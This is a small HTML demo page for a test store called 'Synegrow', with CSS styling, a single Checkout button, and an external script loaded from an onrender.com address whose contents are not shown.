<!doctype html>
<html>
  <head>
    <title>Test Store</title>

    <style>
      body {
        margin: 0;
        font-family: "Segoe UI", sans-serif;
        background: #f6f7fb;
        display: flex;
        justify-content: center;
        align-items: center;
        height: 100vh;
      }

      .container {
        background: white;
        padding: 30px;
        border-radius: 16px;
        box-shadow: 0 10px 25px rgba(0, 0, 0, 0.08);
        text-align: center;
        width: 320px;
      }

      .title {
        font-size: 24px;
        font-weight: 600;
        margin-bottom: 10px;
      }

      .subtitle {
        font-size: 14px;
        color: #666;
        margin-bottom: 20px;
      }

      .product-preview {
        background: #fafafa;
        border-radius: 12px;
        padding: 15px;
        margin-bottom: 20px;
      }

      .product-preview img {
        width: 100%;
        border-radius: 10px;
        margin-bottom: 10px;
      }

      .product-name {
        font-weight: 600;
      }

      .product-price {
        color: #333;
        margin-top: 4px;
      }

      .btn {
        width: 100%;
        padding: 12px;
        background: black;
        color: white;
        border: none;
        border-radius: 10px;
        font-size: 16px;
        cursor: pointer;
        transition: 0.2s ease;
      }

      .btn:hover {
        background: #333;
        transform: translateY(-1px);
      }
    </style>
  </head>

  <body>
    <div class="container">
      <div class="title">Synegrow</div>
      <div class="subtitle">Simple demo checkout</div>

      <button class="btn" name="checkout">Checkout</button>
    </div>

    <script src="https://script-zfht.onrender.com/script.js"></script>
  </body>
</html>
